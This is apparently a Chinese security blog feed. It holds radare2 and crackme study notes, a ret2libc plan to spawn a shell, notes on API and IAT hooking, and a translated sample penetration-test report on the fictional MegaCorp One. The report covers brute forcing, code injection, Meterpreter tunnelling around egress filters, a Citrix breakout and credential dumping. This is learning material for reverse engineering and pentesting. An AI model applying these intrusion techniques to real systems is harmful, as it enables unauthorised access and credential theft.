<h3 id="r2-图形模式下，如何跳转和返回函数"><a href="#r2-图形模式下，如何跳转和返回函数" class="headerlink" title="r2 图形模式下，如何跳转和返回函数"></a>r2 图形模式下，如何跳转和返回函数</h3><p>图形模式下，按<code>o</code>进行跳转<br>按<code>u</code>返回上一个函数</p>
<hr>
<p>ff07031d6fb052490149f44b1d5e94f1592b6bac93c06ca9</p>
<p>25260060504_VE_T25_<em>t</em>_</p>
<hr>
<p><code>Usage: jump LOCATION</code><br>Give as argument either LINENUM or *ADDR, where ADDR is an express</p>
]]></content>
      <tags>
        <tag>RCE</tag>
      </tags>
  </entry>
  <entry>
    <title>逆向_root_me_4</title>
    <url>/2020/10/19/%E9%80%86%E5%90%91_root_me_4/</url>
    <content><![CDATA[<h2 id="ELF-—-Random-Crackme"><a href="#ELF-—-Random-Crackme" class="headerlink" title="ELF — Random Crackme"></a>ELF — Random Crackme</h2><p>将<code>magic</code>之前的内容都删除，因为之前的垃圾内容，使得不能运行ELF文件<br><code>ELF files start with 7f 45 4c 46</code><br><a href="https://imgchr.com/i/0v8xN8"><img src="https://s1.ax1x.com/2020/10/19/0v8xN8.jpg" alt="0v8xN8.jpg" border="0" /></a></p>
<a id="more"></a>
<hr>
<p><code>r2 -ww ./ch3.bin</code><br><code>-w</code>          open file in write mode<br><code> ww foobar</code>            write wide string ‘f\x00o\x00o\x00b\x00a\x00r\x00’<br> <code>wx 9090</code>     write two intel nops</p>
<pre><code>[0x080482f0]&gt; wx eb @ 0x0804841A</code></pre>
<p><code>Short Jump</code>（短跳转）机器码 <code>EB</code></p>
<hr>
<p><a href="https://imgchr.com/i/0vGPjs"><img src="https://s1.ax1x.com/2020/10/19/0vGPjs.jpg" alt="0vGPjs.jpg" border="0" /></a></p>
<p>用time,rand产生随机密码<br>gdb 直接设置<code>eip</code> 跳过代码</p>
<pre><code>set $eip=xxxx</code></pre>
<p>再运行<code>c</code></p>
<hr>
<pre><code>binwalk crackme_wtf</code></pre>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">r2</span><br><span class="line">aaa</span><br><span class="line">afl <span class="comment">//list function</span></span><br><span class="line">s sym.main</span><br></pre></td></tr></table></figure>

<h2 id="ELF-x64-Crackme-automating"><a href="#ELF-x64-Crackme-automating" class="headerlink" title="ELF x64 - Crackme automating"></a>ELF x64 - Crackme automating</h2><p>str=”break\n”<br>var4=0<br>var8=0xf7<br><code>(MOVSXD r64, r/m32</code> Move doubleword to quadword with sign-extension.<br>这是64位代码中的指令，它将32位寄存器或地址转换为32位值，并将其符号扩展为64位寄存器。 符号扩展采用源的最高位（符号位）的值，并使用它来填充目标的所有高位。)</p>
<p>var4+str<br>位置加var4<br>(<code>movzx</code>是将源操作数的内容拷贝到目的操作数，并将该值用0扩展至16位或者32位。但是它只适用于无符号整数。 他大致下面的三种格式。)</p>
<p>str[0]<br><code>MOVSX</code> 指令（进行符号扩展并传送）将源操作数内容复制到目的操作数，并把目的操作数符号扩展到 16 位或 32 位。这条指令只用于有符号整数，</p>
<p><code>xor (str[0] ,0xa3)=0xf7</code></p>
<p><code>str[1]</code></p>
<p><code>cmp eax, 0xf7</code></p>
<p>注：上篇有自动化代码链接</p>
]]></content>
      <tags>
        <tag>RCE</tag>
      </tags>
  </entry>
  <entry>
    <title>逆向 学习r2 part2</title>
    <url>/2020/09/27/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0r2part2/</url>
    <content><![CDATA[<h2 id="逆向-学习r2-part2"><a href="#逆向-学习r2-part2" class="headerlink" title="逆向 学习r2 part2"></a>逆向 学习r2 part2</h2><p><a href="https://www.megabeets.net/a-journey-into-radare-2-part-2/">https://www.megabeets.net/a-journey-into-radare-2-part-2/</a></p>
<p>在NX和ASLR的保护下</p>
<hr>
<a id="more"></a>

<p><code>$ r2 -d megabeets_0x2</code><br><code>-d </code> – Open in the debug mode<br>aas – Analyze functions, symbols and more</p>
<p><code>dcu address      Continue until address</code></p>
<p><code>VV</code></p>
<p><code>pdf @ sym.beet</code></p>
<hr>
<h3 id="ragg2"><a href="#ragg2" class="headerlink" title="ragg2"></a>ragg2</h3><p><code>ragg2</code>, which allows us to generate a cyclic pattern called De Bruijn Sequence and check the exact offset where our payload overrides the buffer.<br>它允许我们生成一个称为De Bruijn Sequence的循环模式，并检查有效载荷覆盖缓冲区的确切偏移量</p>
<pre><code>-P [size]       prepend debruijn pattern
 -q [fragment]   debruijn pattern offset
 -r              show raw bytes instead of hexpairs</code></pre>
<p><code>$ ragg2 -P 100 -r</code><br><em>之前SEH攻击 应该有用过</em></p>
<hr>
<h3 id="rarun2"><a href="#rarun2" class="headerlink" title="rarun2"></a>rarun2</h3><p><code>rarun2</code>用作启动器，用于运行具有不同环境，参数，权限，目录的程序，并覆盖默认文件描述符（例如stdin）。<br>当您必须使用长参数运行程序，将大量数据传递给stdin或类似的东西时，这很有用，这通常是利用二进制文件的情况。</p>
<hr>
<pre><code>$ ragg2 -P 200 -r &gt; pattern.txt
$ cat pattern.txt</code></pre>
<hr>
<pre><code>$ vim profile.rr2
$ cat profile.rr2
#!/usr/bin/rarun2
stdin=./pattern.txt</code></pre>
<hr>
<p><code>$ r2 -r profile.rr2 -d megabeets_0x2</code><br>-r [rarun2]  specify rarun2 profile to load (same as -e dbg.profile=X)<br>-d           debug the executable ‘file’ or running process ‘pid’</p>
<hr>
<p>信号是发送到同一进程中的某个进程或特定线程的异步通知，以便将发生的事件通知给它。<br>·当SIGSEGV（11）信号做出无效的虚拟内存引用或分段错误时，即在执行分段违规时，将其发送到进程。</p>
<hr>
<p><code>wopO value </code>       Finds the given value into a De Bruijn Pattern at current offset</p>
<p>| dr                     Show ‘gpr’ registers<br>wopO <code>dr eip</code><br>没有成功<br>wopO 0x41417641</p>
<hr>
<p>i   Get info from opened file (see rabin2’s manpage)<br>ii                 Imports<br>iip 更简明</p>
<hr>
<p>The plan</p>
<ol>
<li>Leak the real address of puts</li>
<li>Calculate the base address of libc</li>
<li>Calculate the address of system</li>
<li>Find an address in libc that contains the string /bin/sh</li>
<li>Call system with /bin/sh and spawn a shell</li>
</ol>
<hr>
<p><code>过程链接表Procedure Linkage Table（PLT)</code>是一个内存结构，其中包含外部功能的代码存根，这些函数的地址在链接时是未知的。<br>·每当我们在.text段中看到对函数的CALL指令时，都不会直接调用该函数。<br>·相反，它在PLT处调用存根代码，例如<code>func_name @ plt</code>。<br>然后，存根跳转到<code>全局偏移表（GOT）</code>中为此功能列出的地址。<br>如果它是此功能的第一个CALL，则<code>GOT条目将指向PLT，后者将调用动态链接器，该链接器将解析所需功能的实际地址</code><br>下次调用func_name @ plt时，存根直接从<code>GOT获取功能地址</code>。<br>((少了动态链接步骤？？))</p>
<hr>
<p><code>pwntools </code>漏洞利用框架</p>
<hr>
<pre><code>~ character is radare’s internal grep
[0xf7763b30]&gt; # the address of puts@plt:
[0xf7763b30]&gt; ?v sym.imp.puts //Usage: ?v[id][ num]  # Show value
0x08048390
[0xf7763b30]&gt; ?v reloc.puts</code></pre>
<p><code>sy按tab键自动搜寻</code></p>
<hr>
<pre><code>Usage: dmi    # List/Load Symbols
All these paddr=0x000xxxxx are the offsets of the function from libc base. </code></pre>
<hr>
<p>为此，我们将使用radare的搜索功能。<br>·默认情况下，radare正在dbg.map中搜索，这是当前的内存映射。<br>·我们要搜索所有内存映射，因此我们需要对其进行配置：<br>[0x080483d0]&gt; e search.in = dbg.maps<br>要以可视方式配置雷达，请使用Ve</p>
<hr>
<pre><code>Usage: /[!bf] [arg]  Search stuff

dmm   List modules of target process
[0x080483d0]&gt; ?X 0xf7700768-0xf7599000</code></pre>
]]></content>
      <tags>
        <tag>RCE</tag>
      </tags>
  </entry>
  <entry>
    <title>逆向工程核心原理_little_summary</title>
    <url>/2020/10/06/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86_little_summary/</url>
    <content><![CDATA[<h3 id="INT-和-IAT"><a href="#INT-和-IAT" class="headerlink" title="INT 和 IAT"></a>INT 和 IAT</h3><p>INT  是rva数组，INT表示数组首地址 数组元素是一个地址 指向由一个2字节ordinall地址和函数名称组成的结构体  第一个值地址指向第一个结构体</p>
<p>如果IAT存在于 选择头中IAT表明的地址中 相应没有写权限也没事</p>
<p>INT和IAT指向内容有时相同 表示地址肯定不同 因为保存在不同地址 所指内容相同</p>
<a id="more"></a>
<hr>
<h3 id="进程内存转储"><a href="#进程内存转储" class="headerlink" title="进程内存转储"></a>进程内存转储</h3><p>OLLYGDB插件？？ dump命令<br>是解压缩运行时，将内存转为文件，方便查看</p>
<hr>
<h3 id="代码注入"><a href="#代码注入" class="headerlink" title="代码注入"></a>代码注入</h3><p>使用CALL指令将接下来的在代码间的字符串数据地址压入栈，然后直接接下来运行命令</p>
<p>CALL EAX<br>EAX保存函数地址<br>32位保存返回内容</p>
<hr>
<h3 id="top-命令-linux"><a href="#top-命令-linux" class="headerlink" title="top 命令 (linux)"></a>top 命令 (linux)</h3><p>查看 CPU 时间在 User space 与 Kernel Space 之间的分配情况</p>
<hr>
<h3 id="SEH链"><a href="#SEH链" class="headerlink" title="SEH链"></a>SEH链</h3><p>ollydbg VIEW-SEH CHAIN</p>
<hr>
<h3 id="API钩取"><a href="#API钩取" class="headerlink" title="API钩取"></a>API钩取</h3><p>windows 中内核模式所有代码共用一个虚拟空间地址，用API传<br>e1 = 9Fh =&gt; 0fh*2^7 = 780h</p>
<p>使用常规系统资源的API会经由kernel32.dll和ntdll.dll不断向下调用，最后经由SYSENTER命令进入内核模式</p>
<p><img src="https://s1.ax1x.com/2020/10/06/0N35f1.png" alt="0N35f1.png"></p>
<hr>
<p><img src="https://s1.ax1x.com/2020/10/06/0N3vtA.png" alt="0N3vtA.png"></p>
<hr>
<h3 id="动态方法常用-调试和注入"><a href="#动态方法常用-调试和注入" class="headerlink" title="动态方法常用 调试和注入"></a>动态方法常用 调试和注入</h3><h4 id="方法1：调试"><a href="#方法1：调试" class="headerlink" title="方法1：调试"></a>方法1：调试</h4><p>异常必须处理为EXCEPTION_BREAKPOINT 汇编指令为int 3 IA-32指令为0xCC </p>
<p>用异常获取API的控制</p>
<p>线程上下文，（执行完一个线程时间片，执行另一个），也就是各个寄存器信息，保存在CONTEXT结构体中。</p>
<p>CONTEXT.esp</p>
<p>api钩取 获取某个API的控制权</p>
<h4 id="方法2：DLL注入"><a href="#方法2：DLL注入" class="headerlink" title="方法2：DLL注入"></a>方法2：DLL注入</h4><p>setwindowstextA 表示ASCII<br>setwindowstextW 表示宽字符 win中为Unicode码</p>
<h3 id="IAT钩取"><a href="#IAT钩取" class="headerlink" title="IAT钩取"></a>IAT钩取</h3><p>通过注入DLL，修改IAT中指向某API的地址改为指向自己API的地址，自己的函数再去调用某API，来达到修改的目的</p>
<hr>
<h3 id="搜索API"><a href="#搜索API" class="headerlink" title="搜索API"></a>搜索API</h3><p><strong>在用ollydng进行内部模块call 搜索时，先选取对的模块。右键-select moudle</strong><br>在用ollydbg 中<code> search for name</code>命令</p>
<hr>
<h3 id="API代码修改"><a href="#API代码修改" class="headerlink" title="API代码修改"></a>API代码修改</h3><p>将API头五个字节 修改 为JMP XXXXXXXX<br>即跳转到注入的函数中</p>
<p>通过将ntdll.ZwQuerySystemInformation() 函数形成的链表中删除进程信息即可做到隐藏相关进程。</p>
<h3 id="全局API钩取"><a href="#全局API钩取" class="headerlink" title="全局API钩取"></a>全局API钩取</h3><p>通过修改ntdll.ZwResumeThread() API</p>
<h3 id="热补丁-hot-patch"><a href="#热补丁-hot-patch" class="headerlink" title="热补丁 hot patch"></a>热补丁 hot patch</h3><p>修改7字节代码<br>1.二次跳转<br>两字节跳到指令上面，用五字节跳到自己的函数地址<br>2.不用脱钩，地址+2字节，就可正常运行</p>
<p>ia-32 E9 表示far jmp 五字节。<br><code>E9 XXXXXXXX=要跳转的地址-当前指令地址-当前指令长度（5）</code></p>
<p>EB 表示 short jmp 两字节<br>依托当前EIP 在-128~127范围间跳转<br><code>XX=要跳转的地址-当前指令地址-当前指令长度（2）</code></p>
]]></content>
      <tags>
        <tag>RCE</tag>
      </tags>
  </entry>
  <entry>
    <title>penetration test report interpretation</title>
    <url>/2019/03/28/penetration-test-report-interpretation/</url>
    <content><![CDATA[<p><em>老师布置的一项任务，deploy丰富博客</em></p>
<hr>
<h2 id="渗透测试报告"><a href="#渗透测试报告" class="headerlink" title="渗透测试报告"></a>渗透测试报告</h2><p>目录<br>执行总结    3<br>结论总结    3<br>攻击记叙    3<br>远程系统调查    3<br>管理员网络服务器界面攻击    5<br>命令解析器到管理服务器    7<br>提权    9<br>JAVA客户机攻击    9<br>升级为本地管理员    11<br>深包检测规避    12</p>
<a id="more"></a>
<p>Citrix环境下的漏洞    14<br>升级为域管理员    17<br>总论    19<br>建议    20<br>风险等级    20<br>附录A：漏洞细节及减轻危害    21<br>风险等级范围    21<br>默认的或弱的凭证    21<br>密码重用    21<br>共享本地管理员密码    21<br>补丁管理    21<br>DNS区域传送    22<br>默认APACHE文件目录    22<br>附录B:关于Offensive Security    22</p>
<h2 id="执行总结"><a href="#执行总结" class="headerlink" title="执行总结"></a>执行总结</h2><p>为了检测经过一次蓄意攻击中后会出现什么问题，MegaCory One授权Offensive Security进行了这一次的渗透测试。我们有一个准则，就是为了模拟一个蓄意的攻击者，这个攻击者热衷于攻击MegaCory One的系统，并且我们要达到下列目的：</p>
<p>    确认远程攻击者能否破坏MegaCory One的防御系统<br>    确认攻击所带来的影响:<br>    公司重要数据是否泄露<br>    MegaCory One信息系统内部结构是否泄露以及是否可用</p>
<p>我们的工作主要是在确认和利用系统漏洞上，远程攻击者可以通过这些漏洞以未授权的方式获得一些重要数据。这些攻击方式可能一个只会上网的人也可以用。评估是按照NIST SP 800-115 中的标准下进行的，并且所有的测试都是可控的。</p>
<h2 id="结论总结"><a href="#结论总结" class="headerlink" title="结论总结"></a>结论总结</h2><p>对于MegaCorp One公司系统的第一次检测，就发现了一个错误配置的DNS服务器，其允许进行区域传送。这个漏洞给检测提供了许多可供攻击的主机。检查了这些主机后，发现一个受密码保护的网站服务器界面。我们通过穷举攻击爆出了密码从而能够进入网站，在建了符合网站密码的格式的随机字母表后。</p>
<p>这个管理界面非常脆弱，因为有一个远程代码注入漏洞，通过这个漏洞可以获得对底层操作系统访问的权限。因为没有正确的系统更新，而使最初的小问题变成了大问题。进一步检查后，发现管理用户可以在这个受损的服务器上运行着一个JAVA程序。当我们上传了恶意代码后，取得了访问权限。</p>
<p>利用这个服务器爆出的密码，我们能够访问先前不能访问的资源。这使得我们能够使用本地账户就可以登录许多的WINDOWS主机，一个CITRIX的服务器，还有对于WINDOWS活动目录完整的权限。通过将恶意流量封装进协议里，现有的恶意流量控制就可以避开。</p>
<h2 id="攻击记叙"><a href="#攻击记叙" class="headerlink" title="攻击记叙"></a>攻击记叙</h2><h3 id="远程系统调查"><a href="#远程系统调查" class="headerlink" title="远程系统调查"></a>远程系统调查</h3><p>为了更好的评估，MegaCorp One提供了很少的信息，除了组织的域名:megacorpone.com。这样做的目的是为了更符合一个没有得到内部信息的攻击者。为了避免攻击其他组织的系统，在攻击前，所有系统都进行了所有权验证。</p>
<p>我们检查了megacorpone.com域名的DNS服务器，查看有没有可能的攻击目标。</p>
<p>Figure 1-通过收集域名的信息找到了三个DNS服务器</p>
<p>利用这几个服务器，我们试着去进行区域传输。发现ns2.megacorpone.com的区域传输配置错误。这暴露了许多的主机名和其相关的IP地址，这非常有帮助。（Figure 2）区域传输提供给攻击者详细的信息，这个组织的职能，网段。详细请看附录A。</p>
<p>Figure 2-一个错误配置的DNS服务器，允许完整的五限制的区域传输</p>
<p>这些识别出的主机提交给了MegaCorp One确认，确定整个50.7.67.X网段都要在评估范围内。这些主机会被扫描，接着列举出所有正在运行的服务。为了确定这些服务器潜在的漏洞，它们会被仔细的检查。</p>
<p>通过枚举技术和网络扫描，可以建立一个映射MegaCorp One网络的结构。</p>
<p>在Figure 3中展示了目标网络结构。例如深包检查这样的额外控制细节，会在接下来的评估中提到，这里为完整性，先说一点。</p>
<p>Figure 3-目标网络</p>
<p>管理员网络服务器界面攻击<br>Admin.megacorpone.com服务器在81端口上运行着Apache服务。通过站点的根URL访问，发现了一个空白页面。接下来，进行一次快速的枚举扫描，以期找到公用目录和文件。（Figure 4）</p>
<p>Figure 4-admin.megacorpone.com的枚举攻击揭露了网站的文件结构</p>
<p>扫面的结果显示没有改变Apache公共默认目录(详细请看附录A)，我们确定/admin是唯一可通过身份验证的目录。（Figure 5）</p>
<p>Figure 5-admin目录受密码保护</p>
<p>我们定作了一个基于该网站内容的字典文件，为了暴力破解密码。最初的字典包括了331个特意字符串，通过几轮置换，形成了有16201个字符串的字典文件。用admin的用户名和这个字典来暴力破解。</p>
<p>Figure 6-使用字典攻击来获得管理员密码</p>
<p>暴力攻击找到了admin用户的密码”nanotechnology1”。利用这个账户就能一未授权的方式得到网站受保护部分的内容。（Figure 6）详细请看附录A，怎么利用这个漏洞。</p>
<p>这里面有一个SQLite Manager服务界面，无需任何凭证就可以访问。利用这个界面，发现支持phpSQLiteCMS实例的数据库。<a href="http://phpsqlitecms.net/">http://phpsqlitecms.net/</a></p>
<p>Figure 7-网站运行着SQLite数据库<br> <br>通过这个界面就可以获得数据，比如用户名，以及相关的密码哈希值。（Figure 8）</p>
<p>Figure 8-缺少额外的设置，攻击者可以很方便地获得数据，从”userdata”这个数据库</p>
<p>表中的密码hash值不符合任何标准的格式。使用一个叫”phpselitecms”的软件，查看源代码以确定hash值是怎么产生的。可以看到这个函数的功能是hash账户的密码。</p>
<p>Figure 9-查看源码发现密码hash生成算法</p>
<p>知道了密码hash的格式，还有随意生成的十个字符的salt值，可以将这些hash值转变成等价的加了salt的SHA1值，进行暴力攻击。</p>
<p>得到了两个明文密码，尽管不是立马就有用，但可能在组织里其他的系统中可以用到。</p>
<h3 id="命令解析器到管理服务器"><a href="#命令解析器到管理服务器" class="headerlink" title="命令解析器到管理服务器"></a>命令解析器到管理服务器</h3><p>先前发现的SQLite Manager有一个著名的代码注入漏洞。(<a href="https://www.exploit-db.com/exploits/24320)%E5%88%A9%E7%94%A8%E8%BF%99%E4%B8%AA%E6%BC%8F%E6%B4%9E%E5%8F%AF%E4%BB%A5%E8%8E%B7%E5%BE%97shell%EF%BC%8C%E8%BF%9B%E5%85%A5%E7%BD%91%E7%AB%99%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%94%A8%E6%88%B7%E4%BD%BF%E7%94%A8%E7%9A%84%E7%B3%BB%E7%BB%9F%E3%80%82%E4%BD%BF%E7%94%A8%E4%B8%80%E4%B8%AA%E6%94%B9%E8%89%AF%E8%BF%87%E7%9A%84%E5%85%AC%E5%85%B1%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%BA%93%EF%BC%8C%E5%8F%AF%E4%BB%A5%E5%BE%97%E5%88%B0admin.megacorpone.com%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%8A%E6%9C%89%E9%99%90%E7%9A%84%E4%BA%A4%E4%BA%92%E6%9D%83%E3%80%82%E8%AF%A6%E7%BB%86%E8%AF%B7%E7%9C%8B%E9%99%84%E5%BD%95A">https://www.exploit-db.com/exploits/24320)利用这个漏洞可以获得shell，进入网站服务器用户使用的系统。使用一个改良过的公共漏洞利用库，可以得到admin.megacorpone.com服务器上有限的交互权。详细请看附录A</a>.</p>
<p>Figure 10-利用一个公开的可用的SQLite漏洞，就能以未授权的方式进入系统</p>
<p>Figure 11-只能取得www-data这个用户的权限</p>
<p>MegaCorp One使用的SQLite Manager的版本和该存在该漏洞的版本有一些不同。尽管使用的版本也同样存在相同的底层问题，但在没有修正的情况下，这个漏洞不能发挥作用。所以我们添加了功能，让它支持HTTP认证，适合于新版本的SQLite Manager。这个新的漏洞随后会发布出去。</p>
<p>在图12中可以看到方案的内容。</p>
<p>Figure 12-网络服务器的攻击方案
 </p>
<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>当得到了底层系统的交互权后，我们继续寻找可以提升权限的方法。随后，找到了一个可以可以利用的提权的漏洞。(<a href="http://www.exploit-db.com/exploits/18411/)%E8%AF%A6%E7%BB%86%E4%BF%A1%E6%81%AF%E8%AF%B7%E7%9C%8B%E9%99%84%E5%BD%95A%E3%80%82">http://www.exploit-db.com/exploits/18411/)详细信息请看附录A。</a></p>
<p>Figure 13-使用一个提权的漏洞，该主机没有打补丁，所以可以用</p>
<p>因为上传了漏洞利用工具，所以让利用该漏洞有一定的可行性。如果没有这些工具，还是由可能成功提权的，尽管这么做工作量会大大增加。</p>
<p>服务器有许多漏洞，可以给攻击者很多机会，如果不补救的话。有了管理员的权限，攻击者可以做很多的事，既可以攻击MegaCorp One自己，也可以攻击它的用户。当然，很大的可能是同时做这两件事情。</p>
<h3 id="JAVA客户机攻击"><a href="#JAVA客户机攻击" class="headerlink" title="JAVA客户机攻击"></a>JAVA客户机攻击</h3><p>登录管理员账户，分析该系统。找到了网站的一个私有部分，这个部分给一些特殊的工作站运行一个Java小程序。这个有问题的网段后来被发现是MwgaCorp One的管理网段。</p>
<p>Figure 14-Htaccess规则暴露了该网络的一个子网</p>
<p>通过查看log文件和Java小程序的运行方式，发现这个程序给MegaCorp One子网内部用户提供了管理员功能。这对攻击者来说非常有利，因为它提供了进入内网的可能方法，如果没有这个程序，进入内网会很困难。</p>
<p>获得了MegaCorp One的许可后，我们添加了一个可被客户机下载的小程序。攻击的原理是让客户机信任这个程序，允许运行，就可以连接到其他的客户机。这是普通的社会工程攻击的衍生品，所谓社会工程学攻击，就是让受害者主动去运行一个有害的程序。在这个例子中，不用去误导受害者，因为这个程序早已被认为是可信的。</p>
<p>正如所料，可以连接上其他客户机。</p>
<p>Figure 15-利用恶意的java小程序，可以操纵主机</p>
<p>在适当的地方实施该方案，可以得到管理员网络的系统权限，见图16。</p>
<p>Figure 16-Java小程序成功攻击</p>
<h3 id="升级为本地管理员"><a href="#升级为本地管理员" class="headerlink" title="升级为本地管理员"></a>升级为本地管理员</h3><p>Java小程序的攻击只能提供一般用户的权限。为了能做更多的事，需要逐步提升权限，成为域管理员。首先，要获得本地管理权限。要达成这一目的，先检查系统看看有什么漏洞。</p>
<p>发现一个组策略首选项文件，其允许用户解密本地管理员密码。(<a href="http://msdn.microsoft.com/en-us/library/cc422924.aspx,http://blogs.technet.com/b/grouppolicy/archive/2009/04/22/passwords-in-group-policy-preferences-updated.aspx)%E8%AF%A6%E6%83%85%E8%AF%B7%E7%9C%8B%E9%99%84%E5%BD%95A%E3%80%82">http://msdn.microsoft.com/en-us/library/cc422924.aspx,http://blogs.technet.com/b/grouppolicy/archive/2009/04/22/passwords-in-group-policy-preferences-updated.aspx)详情请看附录A。</a></p>
<p>Figure 17-利用这个漏洞，可以获得域控制器的Groups.xml文件</p>
<p>Figure 18-在Groups.xml中包含加密的本地管理员密码</p>
<p>Figure 19-使用Microsoft发布的加密密钥，这个加密密码很容易解密</p>
<p>使用这个明文密码，得到客户机的本地管理员权限。</p>
<h3 id="深包检测规避"><a href="#深包检测规避" class="headerlink" title="深包检测规避"></a>深包检测规避</h3><p>当尝试建立进入受损系统的附加层时，遇到了进攻性出口过滤。这还是第一次碰到，当为Microsoht远程桌面协议建立加密的出口隧道。</p>
<p>Figure 20-初步尝试建立RDP的出隧道被出口过滤系统阻止</p>
<p>另外，当尝试连接攻击者的在80端口上的SSH服务器时，发现网络协议强制执行。我们创建了一个隧道来避开过滤，这个隧道有个运行的meterpreter会话，允许获取攻击者分享的文件。用这个会话在受损主机上用本地管理员权限运行windows SHELL。在这个shell里，执行一段额外的meterpreter关键代码。</p>
<p>Figure 21-通过最初的meterpreter会话建立端口转发， 可以直接访问受损主机</p>
<p>Figure 22-用这个新建立的连接来获得主机的shell</p>
<p>Figure 23-在10.7.0.22上用本地管理员权限建立一个meterpreter shell</p>
<p>有了这个meterpreter shell，就可以利用HTTP-Tunnel，这是一个开源程序，（<a href="http://http-tunnel.sourceforge.net/%EF%BC%89%E5%8E%BB%E5%B0%81%E8%A3%85HTTP%E8%B4%9F%E8%BD%BD%E5%86%85%E7%9A%84%E4%BB%BB%E6%84%8F%E6%B5%81%E9%87%8F%E3%80%82%E6%AF%94%E5%A6%82%E5%B0%81%E8%A3%85%E6%94%BB%E5%87%BB%E8%80%85%E5%92%8C%E4%B8%BB%E6%9C%BA%E7%9A%84%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2%E8%BF%9E%E6%8E%A5%E6%95%B0%E6%8D%AE%E3%80%82%E8%BF%99%E4%B9%8B%E5%90%8E%EF%BC%8C%E6%88%91%E4%BB%AC%E5%B0%B1%E5%8F%AF%E4%BB%A5%E5%BE%97%E5%88%B0%E5%AE%8C%E6%95%B4%E7%9A%84%E8%AE%BF%E9%97%AE%E6%96%B9%E5%BC%8F%EF%BC%8C%E8%80%8C%E4%B8%8D%E4%BB%85%E4%BB%85%E6%98%AF%E5%91%BD%E4%BB%A4%E8%A1%8C%E3%80%82%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2%E8%BF%9E%E6%8E%A5%E6%98%AF%E7%94%A8%E2%80%9Cmike%E2%80%9C%E8%BF%99%E4%B8%AA%E7%94%A8%E6%88%B7%E7%9A%84%E5%AF%86%E7%A0%81%E5%88%9B%E5%BB%BA%E7%9A%84%EF%BC%8C%E2%80%9Dmike%E2%80%9C%E7%9A%84%E5%AF%86%E7%A0%81%E5%B0%B1%E6%98%AF%E4%B9%8B%E5%89%8D%E4%BB%8ESQLite">http://http-tunnel.sourceforge.net/）去封装HTTP负载内的任意流量。比如封装攻击者和主机的远程桌面连接数据。这之后，我们就可以得到完整的访问方式，而不仅仅是命令行。远程桌面连接是用“mike“这个用户的密码创建的，”mike“的密码就是之前从SQLite</a> Manager发现的。详情请看附录A。</p>
<p>Figure 24-通过http隧道屏蔽过滤协议，建立远程桌面连接</p>
<p>此时，MefaCorp One的网络已被完全攻陷，如图25所示。我们能够以控制台的权限访问一台Megacorp One信任的电脑。只是访问受限，因为是靠一个无特权的域用户，和一个本地管理员账户。</p>
<p>Figure 25-到达管理员子网</p>
<h3 id="Citrix环境下的漏洞"><a href="#Citrix环境下的漏洞" class="headerlink" title="Citrix环境下的漏洞"></a>Citrix环境下的漏洞</h3><p>我们用远程桌面访问方式进入内部网络，继续扫描以发现有价值的目标。找到了一个Citrix的服务器，在受损主机上它被设置成主页。使用和建立远程桌面连接相同的证书，成功登录Citrix。</p>
<p>Figure 26-发现一台支持ie的Citrix服务器</p>
<p>此Citrix环境说明“ie“是唯一可使用的程序。这种做法被很多组织采用来限制进入Citrix服务器底层的操作系统。但是有很多的方法可以绕过限制。这里，我们用”Save“这个对话框生成一个批处理文件，其能让我们使用Powershell。</p>
<p>这样做可能成功，因为“Save”对话框的操作方式大致相同，都是“Windows Explorer”的文件管理窗口。</p>
<p>Figure 27-使用Save对话框有可能突破Citrix环境下的限制</p>
<p>Figure 28-在Citrix上创建有Powershell程序的批处理文件</p>
<p>Figure 29-执行Pwershell突破Citrix的限制</p>
<p>Powershell也可以用来下载恶意的代码，这些代码创建底层服务器的meterpreter会话。</p>
<p>Figure 30-Powershell允许终端用户接受任意源的文件，包括远程网络地址</p>
<p>利用Save对话框运行任意可执行的代码，可以和之前的发现结合在一起，之前发现了本地账户密码，可以以管理员的权限执行程序。这就取得了这个系统的完整的管理员控制权。详情请看附录A。</p>
<p>Figure 31-攻击者利用管理员密码以管理员权限执行恶意代码</p>
<p>Figure 32-完成Citrix服务器的完全控制</p>
<p>Figure 33-在管理员内网中添加了一台主机</p>
<h3 id="升级为域管理员"><a href="#升级为域管理员" class="headerlink" title="升级为域管理员"></a>升级为域管理员</h3><p>有了这台受损Citrix服务器，我们试着在内存中搜索密码。Citrix服务器是这种攻击了的理想的候选，因为可以操作很长时间，而不用重启还有为大量用户提供服务。</p>
<p>我们用Windows Credential Editor这个工具来得到内存中的密码，因为它可以运行在64位的系统上且不会产生错误。</p>
<p>Figure 34-用Windows Credentials Editor得到服务器上的明文密码</p>
<p>这个工具爆出了很多的密码，包括Windows域管理员的密码。详情请看附录A。为了使恢复出来的凭证有效，我们用域管理员权限创建新的远程桌面连接会话。</p>
<p>Figure 35-域管理员证书有效<br>此时，可以控制整个Windows域了。一个恶意攻击者有许多的工具可以用，包括：<br>    在Windows系统上利用组策略上传后门程序。<br>    对任何使用Windows身份验证的系统上存储的所有数据进行排除。<br>    销毁任何以及所有网络资源。<br>    有目的性的攻击MegaCorp One任一职员，通过信息收集工具，例如可以辨认个人信息的keystroke loggers<br>    泄露对MegaCorp One信任的伙伴或支持组织的系统进入方式，便可以展开攻击</p>
<p>可以确定，这些步骤是可行的，且可以在当前环境之外使用。很明显，已经攻陷了整个MegaCorp One域，本地所有系统已经失去了一体性。</p>
<p>Figure 36-攻陷域</p>
<h2 id="总论"><a href="#总论" class="headerlink" title="总论"></a>总论</h2><p>MegaCorp One有一系列的配置错误，而使关键公司资产泄露。如果一个恶意的组织利用这些错误，会产生恶劣的影响。现有的关于密码重用，上传控制的策略还不完善，不能消除漏洞发现产生的影响。</p>
<p>这次渗透测试的具体目标如下：<br>    确认远程攻击者能否攻破MegaCorp One的防御系统<br>    确定安全漏洞的影响：<br>    组织信息的机密性<br>    MegaCorp One信息系统的内部基础结构和可用性</p>
